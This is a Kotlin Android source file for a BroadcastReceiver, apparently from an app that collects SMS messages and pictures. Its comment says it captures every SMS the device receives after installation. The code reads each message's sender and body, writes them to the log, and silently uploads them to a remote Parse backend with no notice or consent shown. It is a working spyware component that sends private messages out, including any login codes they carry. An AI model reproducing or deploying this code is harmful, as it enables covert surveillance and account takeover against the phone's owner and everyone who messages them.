package com.example.sms_and_pictures

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.telephony.SmsMessage
import android.util.Log
import com.example.sms_and_pictures.class_name_sms
import com.parse.ParseObject

class SmsReceiver : BroadcastReceiver() {
    // esse trecho pega os sms que venham a ser enviados ao aparelho depois da instalaçao do app
    override fun onReceive(context: Context?, intent: Intent?) {
        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION == intent?.action) {
            val bundle = intent.extras
            bundle?.let {
                val pdus = bundle.get("pdus") as Array<*>
                for (pdu in pdus) {
                    val message = SmsMessage.createFromPdu(pdu as ByteArray)
                    val sender = message.originatingAddress
                    val messageBody = message.messageBody

                    val smsObject = ParseObject(class_name_sms)
                    smsObject.put("Sender", sender.toString())
                    smsObject.put("MessageBody", messageBody)

                    smsObject.saveInBackground { e ->
                        if (e != null) {
                            Log.e("MainActivity", "Error: ${e.localizedMessage}")
                        } else {
                            Log.d("MainActivity", "Object saved.")
                        }
                    }
                    Log.d("SmsReceiver", "Sender: $sender, Message: $messageBody")

                }
            }
        }
    }
}
